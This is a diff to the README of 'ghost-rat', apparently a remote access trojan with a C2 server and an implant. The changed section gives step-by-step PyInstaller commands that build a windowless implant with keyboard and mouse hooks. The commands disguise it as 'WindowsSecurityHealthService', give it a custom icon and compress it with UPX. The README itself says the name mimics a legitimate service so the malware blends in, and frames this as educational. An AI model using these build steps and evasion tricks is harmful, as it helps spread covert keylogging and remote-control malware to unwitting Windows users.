@@ -144,6 +144,7 @@ ghost-rat/
 ├── c2_server.py            # Linux C2 server (observer bot)
 ├── config.py               # Configuration (tokens, evasion mode, timing)
 ├── requirements.txt        # Python dependencies
+├── icon.png                # Custom icon for the implant .exe
 ├── README.md               # This file
 ├── utils/
 │   ├── __init__.py
@@ -339,34 +340,9 @@ pip install --user -r requirements.txt
 
 ## 🔨 Building the Implant
 
-> ⚠️ **IMPORTANT**: The build commands are different for **Windows** and **Linux**.
-> Using the wrong format will produce a broken file without the `.exe` extension!
+> 💡 The implant `.exe` is **built on your Linux/Kali machine** using PyInstaller, then transferred to the Windows VM for testing.
 
----
-
-### 🪟 Windows (CMD — Recommended)
-
-Copy-paste this **entire single line** into CMD:
-
-```cmd
-pyinstaller --onefile --noconsole --name WindowsSecurityHealthService --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 implant.py
-```
-
-### 🪟 Windows (PowerShell)
-
-In PowerShell, use **backtick** (`` ` ``) for line breaks — NOT backslash `\`:
-
-```powershell
-pyinstaller --onefile --noconsole `
-  --name WindowsSecurityHealthService `
-  --hidden-import=pynput.keyboard._win32 `
-  --hidden-import=pynput.mouse._win32 `
-  implant.py
-```
-
-### 🐧 Linux (Bash)
-
-On Linux/Mac, use backslash `\` for line breaks:
+### Basic Build (Linux)
 
 ```bash
 pyinstaller --onefile --noconsole \
@@ -376,25 +352,53 @@ pyinstaller --onefile --noconsole \
   implant.py
 ```
 
----
+### Build with Custom Icon (Linux — Recommended)
 
-### With a custom icon (Windows CMD):
-```cmd
-pyinstaller --onefile --noconsole --name WindowsSecurityHealthService --icon=myicon.ico --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 implant.py
+A custom icon (`icon.png`) is included in the project. To use it:
+
+**Step 1**: Convert the PNG to ICO format (required for Windows .exe icons):
+```bash
+# Install Pillow if not already in your venv
+pip install Pillow
+
+# Convert PNG → ICO
+python3 -c "from PIL import Image; img = Image.open('icon.png'); img.save('icon.ico', format='ICO', sizes=[(256,256),(128,128),(64,64),(48,48),(32,32),(16,16)])"
 ```
 
-### With UPX compression (Windows CMD):
-```cmd
-pyinstaller --onefile --noconsole --name WindowsSecurityHealthService --upx-dir=C:\upx --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 implant.py
+**Step 2**: Build with the icon:
+```bash
+pyinstaller --onefile --noconsole \
+  --name WindowsSecurityHealthService \
+  --icon=icon.ico \
+  --hidden-import=pynput.keyboard._win32 \
+  --hidden-import=pynput.mouse._win32 \
+  implant.py
+```
+
+### Build with UPX Compression (smaller .exe)
+
+```bash
+# Install UPX first: sudo apt install upx
+pyinstaller --onefile --noconsole \
+  --name WindowsSecurityHealthService \
+  --icon=icon.ico \
+  --upx-dir=/usr/bin \
+  --hidden-import=pynput.keyboard._win32 \
+  --hidden-import=pynput.mouse._win32 \
+  implant.py
 ```
 
 ---
 
-**Output**: `dist\WindowsSecurityHealthService.exe`
+**Output**: `dist/WindowsSecurityHealthService.exe`
+
+After building, **copy the .exe to your Windows VM** for testing:
+```bash
+# Example: copy to a shared folder or use SCP
+cp dist/WindowsSecurityHealthService.exe /path/to/shared/folder/
+```
 
 > **Why `WindowsSecurityHealthService`?** The name mimics a legitimate Windows service. This is for educational purposes — to demonstrate how real malware blends in.
-
-> 🔴 **If your output file has NO `.exe` extension**, you used the Linux `\` command on Windows. Delete it and re-run using the **Windows CMD** single-line command above.
 
 ---
 
